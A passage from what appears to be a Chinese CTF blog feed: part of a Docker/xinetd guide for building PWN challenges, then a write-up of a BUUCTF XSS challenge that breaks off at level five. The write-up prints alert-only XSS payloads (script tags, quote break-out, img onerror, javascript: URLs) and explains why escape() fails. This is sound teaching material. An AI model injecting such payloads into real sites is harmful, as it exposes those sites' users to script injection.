&lt;container&gt;</code></td><td>附加到容器的控制台。</td></tr><tr><td><code>docker kill &lt;container&gt;</code></td><td>强制停止容器。</td></tr></tbody></table><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a><strong>常用参数</strong></h3><ul><li><code>-d</code>：后台运行容器（<code>detached</code> 模式）。</li><li><code>-p</code>：端口映射，例如 <code>-p 8080:80</code>。</li><li><code>-v</code>：挂载数据卷，例如 <code>-v /host/path:/container/path</code>。</li><li><code>--name</code>：为容器指定名称。</li><li><code>--rm</code>：容器退出后自动删除。</li><li><code>--network</code>：指定网络。</li></ul><h3 id="第三部分-dockerfile"><a href="#第三部分-dockerfile" class="headerlink" title="第三部分-dockerfile"></a>第三部分-dockerfile</h3><p>该部分跟着下面的pwn出题一起说吧</p><h1 id="PWN出题"><a href="#PWN出题" class="headerlink" title="PWN出题"></a>PWN出题</h1><h2 id="xinetd"><a href="#xinetd" class="headerlink" title="xinetd"></a>xinetd</h2><p>项目地址:<a class="link" href="https://github.com/CTF-Archives/ctf-docker-template">https://github.com/CTF-Archives/ctf-docker-template <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><blockquote><p><strong>使用：</strong></p><p>将程序文件放入 <code>./src</code> 目录即可，文件名请修改为 <code>attachment</code> 作为文件名，便于镜像定位程序位置</p><p>如果需要更改为自己的文件名，需要在 <code>./config/ctf.xinetd</code>、<code>./Dockerfile</code> 和 <code>./service/docker-entrypoint.sh</code> 中进行修改</p></blockquote><ul><li>相关使用项目中也说得比较清楚,比如说我们要出一个ubuntu18.04环境下的题目,那么进入到该项目的ubuntu18.04的目录下,将我们的程序放入到src的目录下即可,注意程序名字设置为<code>attachment</code>,如果要更改的话要修改下面的地方:</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241203134003018.bmp"></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241203134029019.bmp"></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241203134131216.bmp"></p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><ul><li>将一写好的且在ubuntu18.04下编译好的<code>attachment</code>可执行文件,放入到.&#x2F;src里面,然后制作镜像:</li></ul><div class="highlight-container" data-rel="Dockerfile"><figure class="iseeu highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t ezstack . <span class="comment"># ezstack自己取得镜像名字</span></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241203135032224.bmp"></p><p>这样便是制作好了镜像文件,然后让它run起来</p><div class="highlight-container" data-rel="Dockerfile"><figure class="iseeu highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -dit --name ezstack --<span class="built_in">rm</span> -p 9999:9999 -v $(<span class="built_in">pwd</span>):/app 652fe6597d2a</span></span><br></pre></td></tr></table></figure></div><blockquote><p><strong>选项详解</strong>:</p><ul><li><p>**<code>-d</code>**：后台运行容器（detached 模式）。</p></li><li><p>**<code>-i</code>**：让容器保持交互状态（即使没有终端连接）。</p></li><li><p>**<code>-t</code>**：分配一个伪终端（TTY），通常和 <code>-i</code> 一起使用。</p></li><li><p>**<code>--name ezstack</code>**：为容器命名为 <code>ezstack</code>，方便后续操作。</p></li><li><p>**<code>--rm</code>**：容器退出后自动删除，确保运行的容器不会占用多余的存储。</p></li><li><p>**<code>-p 9999:9999</code>**：将主机的 <code>9999</code> 端口映射到容器的 <code>9999</code> 端口。这允许从主机访问容器的服务。</p></li><li><p><code>-v $(pwd):/app</code></p><p>将当前目录挂载到容器中的 <code>./app</code>目录下</p><ul><li><code>$(pwd)</code> 是主机当前目录的路径。</li><li><code>/app</code> 是容器内的路径。<br>挂载后，主机目录中的文件可以直接在容器内访问，适合开发和调试。</li></ul></li></ul><p><strong><code>652fe6597d2a</code></strong><br>这是一个镜像 ID，表示使用该镜像来启动容器。镜像 ID 通常可以通过 <code>docker images</code> 命令找到。</p></blockquote><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241203135646366.bmp"></p><p>这样便是说明该容器已经在运行了,并且影射了端口,下面我们来测试一下连接以及脚本</p><ul><li>连接</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vz ip 9999 <span class="comment"># 仅测试是否会连接上</span></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241203140003753.bmp"></p><p>很明显是布置成功了,下面测试一下脚本：</p><ul><li>脚本：</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241203141138002.bmp"></p><h1 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h1><ul><li><p>主要关注于<code>Dockerfile</code>,<code>ctf.xinetd</code>,<code>flag.sh</code>,<code>start.sh</code>。</p></li><li><p>关于这部分跟平台有关，不同平台的要求或许有不同，这里贴一份天权信安出题的一份<code>dockerfile</code></p></li></ul><h2 id="Dockerfile-1"><a href="#Dockerfile-1" class="headerlink" title="Dockerfile:"></a>Dockerfile:</h2><div class="highlight-container" data-rel="Dockerfile"><figure class="iseeu highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">18.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.list &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get install -y lib32z1 xinetd &amp;&amp; apt-get install -y xinetd build-essential</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> useradd -m ctf</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /home/ctf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cp</span> -R /lib* /home/ctf &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cp</span> -R /usr/lib* /home/ctf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> /home/ctf/dev &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">mknod</span> /home/ctf/dev/null c 1 3 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">mknod</span> /home/ctf/dev/zero c 1 5 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">mknod</span> /home/ctf/dev/random c 1 8 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">mknod</span> /home/ctf/dev/urandom c 1 9 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> 666 /home/ctf/dev/*</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> /home/ctf/bin &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cp</span> /bin/sh /home/ctf/bin &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cp</span> /bin/ls /home/ctf/bin &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cp</span> /bin/cat /home/ctf/bin &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cp</span> /usr/bin/timeout /home/ctf/bin</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./ctf.xinetd /etc/xinetd.d/ctf</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./flag.sh /tmp</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./src/attachment /home/ctf</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./flag /home/ctf</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./fake_flag /home/ctf</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./start.sh /home/ctf</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> 777 /tmp/flag.sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag initial</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> -R root:ctf /home/ctf &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> -R 750 /home/ctf &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">touch</span> /home/ctf/flag &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> 744 /home/ctf/flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;Blocked by ctf_xinetd&quot;</span> &gt; /etc/banner_fail</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&#x27;ctf - nproc 1500&#x27;</span> &gt;&gt;/etc/security/limits.conf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;/etc/init.d/xinetd start; trap : TERM INT; sleep infinity &amp; wait&quot;</span>]</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">9999</span></span><br></pre></td></tr></table></figure></div><h2 id="ctf-xinetd"><a href="#ctf-xinetd" class="headerlink" title="ctf.xinetd"></a>ctf.xinetd</h2><div class="highlight-container" data-rel="Dockerfile"><figure class="iseeu highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">service ctf</span><br><span class="line">&#123;</span><br><span class="line">    disable = no</span><br><span class="line">    socket_type = stream</span><br><span class="line">    protocol    = tcp</span><br><span class="line">    wait        = no</span><br><span class="line">    <span class="keyword">user</span>        = root</span><br><span class="line">    type        = UNLISTED</span><br><span class="line">    port        = <span class="number">9999</span></span><br><span class="line">    bind        = <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line">    server      = /usr/sbin/chroot</span><br><span class="line">    server_args = --userspec=<span class="number">1000</span>:<span class="number">1000</span> /home/ctf ./attachment</span><br><span class="line">    banner_fail = /etc/banner_fail</span><br><span class="line">    <span class="comment"># safety options</span></span><br><span class="line">    per_source= <span class="number">10</span> <span class="comment"># the maximum instances of this service per source IP address</span></span><br><span class="line">    rlimit_cpu= <span class="number">20</span> <span class="comment"># the maximum number of CPU seconds that the service may use</span></span><br><span class="line">    <span class="comment">#rlimit_as  = 1024M # the Address Space resource limit for the service</span></span><br><span class="line">    <span class="comment">#access_times = 2:00-9:00 12:00-24:00</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h2 id="flag-sh"><a href="#flag-sh" class="headerlink" title="flag.sh"></a>flag.sh</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line">name=`<span class="built_in">basename</span> <span class="variable">$0</span> .sh`</span><br><span class="line">flag=<span class="variable">$TQ_FLAG</span></span><br><span class="line"><span class="keyword">if</span> [ ! -n <span class="string">&quot;<span class="variable">$TQ_FLAG</span>&quot;</span> ] ;<span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Incomplete Parameter!&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$flag</span>&quot;</span> &gt; /home/ctf/flag</span><br><span class="line">    <span class="built_in">chmod</span> 644 /home/ctf/flag</span><br><span class="line">    <span class="built_in">rm</span> -rf /tmp/flag.sh</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure></div><h2 id="start-sh"><a href="#start-sh" class="headerlink" title="start.sh"></a>start.sh</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># Add your startup script</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$TQ_FLAG</span>&gt;/home/ctf/flag</span><br><span class="line"><span class="built_in">chmod</span> 755 /home/ctf/flag</span><br></pre></td></tr></table></figure></div><h1 id="上传GZ-CTF"><a href="#上传GZ-CTF" class="headerlink" title="上传GZ-CTF"></a>上传GZ-CTF</h1><ul><li>这部分以后有时间再写吧</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
            <tag> 学习资料 </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS</title>
      <link href="/2024/11/20/XSS/"/>
      <url>/2024/11/20/XSS/</url>
      
        <content type="html"><![CDATA[<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="第二章-web进阶-XSS闯关"><a href="#第二章-web进阶-XSS闯关" class="headerlink" title="[第二章 web进阶]XSS闯关"></a>[第二章 web进阶]XSS闯关</h2><p>题目链接：[BUUCTF在线评测](<a class="link" href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%BA%8C%E7%AB%A0">https://buuoj.cn/challenges#[第二章 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> web进阶]XSS闯关)</p><ul><li>根据提示直接开始游戏，利用<code>alert</code>函数即可</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2024-11-20212007.png"></p><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>既然知道是个闯关游戏，那我们直接试<code>level</code>即可，到第七关的时候就有flag了</p><p><img lazyload src="/images/loading.svg" data-src="/../%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2024-11-20212641.png"></p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n1book&#123;xss_is_so_interesting&#125;</span><br></pre></td></tr></table></figure></div><h3 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h3><ul><li><strong>第一关</strong></li></ul><p>直接利用<code>script</code>标签加上<code>alert</code>函数即可</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241120213054347.bmp"></p><ul><li><strong>第二关</strong></li></ul><p>用同样的方法发现打不通了，于是看源代码,发现有下面一段加密</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="regexp">/span&gt;&lt;/</span>div&gt;&lt;<span class="regexp">/div&gt;&lt;/</span>div&gt;&lt;<span class="regexp">/div&gt;&lt;/</span>div&gt;&lt;/div&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">if</span>(location.<span class="property">search</span> == <span class="string">&quot;&quot;</span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">location.<span class="property">search</span> = <span class="string">&quot;?username=xss&quot;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">var</span> username = <span class="string">&#x27;xss&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ccc&#x27;</span>).<span class="property">innerHTML</span>= <span class="string">&quot;Welcome &quot;</span> + <span class="built_in">escape</span>(username);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div><blockquote><p><strong>判断 <code>location.search</code> 参数</strong>：</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(location.<span class="property">search</span> == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">    location.<span class="property">search</span> = <span class="string">&quot;?username=xss&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>如果 URL 中没有查询参数，自动追加 <code>?username=xss</code>，将 <code>username</code> 默认设置为 <code>xss</code>。</li></ul><p><strong>变量声明</strong>：</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> username = <span class="string">&#x27;xss&#x27;</span>;</span><br></pre></td></tr></table></figure></div><ul><li>这里硬编码了一个变量 <code>username</code>，值为 <code>&#39;xss&#39;</code>。</li></ul><p><strong>DOM 操作</strong>：</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ccc&#x27;</span>).<span class="property">innerHTML</span>= <span class="string">&quot;Welcome &quot;</span> + <span class="built_in">escape</span>(username);</span><br></pre></td></tr></table></figure></div><ul><li>将 <code>username</code> 的值拼接到字符串中，并赋值给页面中 <code>id=&quot;ccc&quot;</code> 的元素。</li><li>使用 <code>escape()</code> 对 <code>username</code> 进行简单编码，试图减小注入的风险。</li></ul><h5 id="漏洞："><a href="#漏洞：" class="headerlink" title="漏洞："></a>漏洞：</h5><p><code>escape()</code> 并不是一种可靠的防护机制，尤其是针对现代浏览器。</p><p>它无法编码 <code>&quot;</code>（双引号）或 <code>&#39;</code>（单引号），也不会对 HTML 元素标签进行特殊处理。</p><p>因此，如果用户通过 URL 参数注入类似以下内容，可能触发 XSS：</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div></blockquote><p>也就是说我们可以通过注释来绕过<code>escape()</code></p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="string">&#x27;;alert(1);&#x27;</span></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241120214102515.bmp"></p><ul><li><strong>第三关</strong></li></ul><p>测试第二关的payload,发现不行，查看发送payload后源代码：</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"><span class="keyword">if</span>(location.<span class="property">search</span> == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">location.<span class="property">search</span> = <span class="string">&quot;?username=xss&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> username = <span class="string">&#x27;\&#x27;;alert(1);&#x27;</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">document.getElementById(&#x27;</span>ccc<span class="string">&#x27;).innerHTML= &quot;Welcome &quot; + username;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure></div><p>很明显可以发现<code>&#39;</code>被\转义了，那我们试试<code>img</code>标签</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p><code>onerror=alert(1)</code>：这是一个 <strong>事件处理器</strong>，当图片加载失败时，浏览器会触发 <code>onerror</code> 中的代码</p></blockquote><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241120215557734.bmp"></p><ul><li><strong>第四关</strong></li></ul><p>进来就在一直循环，查看源代码：</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> time = <span class="number">10</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> jumpUrl;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">if</span>(<span class="title function_">getQueryVariable</span>(<span class="string">&#x27;jumpUrl&#x27;</span>) == <span class="literal">false</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">  jumpUrl = location.<span class="property">href</span>; <span class="comment">// 未提供 jumpUrl 参数，默认跳转到当前页面</span></span></span><br><span class="line"><span class="language-javascript">  &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-javascript">  jumpUrl = <span class="title function_">getQueryVariable</span>(<span class="string">&#x27;jumpUrl&#x27;</span>); <span class="comment">// 从 URL 参数中获取 jumpUrl 的值</span></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">  <span class="built_in">setTimeout</span>(jump,<span class="number">1000</span>,time);</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">jump</span>(<span class="params">time</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">if</span>(time == <span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">  location.<span class="property">href</span> = jumpUrl; <span class="comment">// 倒计时结束，跳转到 jumpUrl</span></span></span><br><span class="line"><span class="language-javascript">  &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-javascript">  time = time - <span class="number">1</span> ;</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ccc&#x27;</span>).<span class="property">innerHTML</span>= <span class="string">`页面<span class="subst">$&#123;time&#125;</span>秒后将会重定向到<span class="subst">$&#123;<span class="built_in">escape</span>(jumpUrl)&#125;</span>`</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="built_in">setTimeout</span>(jump,<span class="number">1000</span>,time); <span class="comment">// 再次调用 jump 函数，继续倒计时</span></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">getQueryVariable</span>(<span class="params">variable</span>)</span></span><br><span class="line"><span class="language-javascript">&#123;</span></span><br><span class="line"><span class="language-javascript">       <span class="keyword">var</span> query = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>.<span class="title function_">substring</span>(<span class="number">1</span>);</span></span><br><span class="line"><span class="language-javascript">       <span class="keyword">var</span> vars = query.<span class="title function_">split</span>(<span class="string">&quot;&amp;&quot;</span>); <span class="comment">// 按 `&amp;` 分割参数</span></span></span><br><span class="line"><span class="language-javascript">       <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;vars.<span class="property">length</span>;i++) &#123;</span></span><br><span class="line"><span class="language-javascript">               <span class="keyword">var</span> pair = vars[i].<span class="title function_">split</span>(<span class="string">&quot;=&quot;</span>); <span class="comment">// 按 `=` 分割键值对</span></span></span><br><span class="line"><span class="language-javascript">               <span class="keyword">if</span>(pair[<span class="number">0</span>] == variable)&#123;<span class="keyword">return</span> pair[<span class="number">1</span>];&#125;</span></span><br><span class="line"><span class="language-javascript">       &#125;</span></span><br><span class="line"><span class="language-javascript">       <span class="keyword">return</span>(<span class="literal">false</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>这段 JavaScript 实现了一个<strong>倒计时跳转功能</strong>，通过 URL 参数指定跳转的目标地址 (<code>jumpUrl</code>)。如果未提供 <code>jumpUrl</code> 参数，则默认跳转到当前页面。</p><ol><li><strong>倒计时显示</strong>： 页面会显示倒计时，提示用户剩余的时间和即将跳转的目标地址。</li><li><strong>跳转逻辑</strong>：<ul><li>倒计时结束后，页面会跳转到指定的 URL。</li></ul></li></ol></blockquote><p>使用第三关的payload无法达成目的，那就将jumpUrl直接复制一个javascript代码：</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jumpUrl=<span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241120220636338.bmp"></p><ul><li><strong>第五关</strong></li></ul><p>查看源码：</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">  &lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">      <span class="comment">// 使用 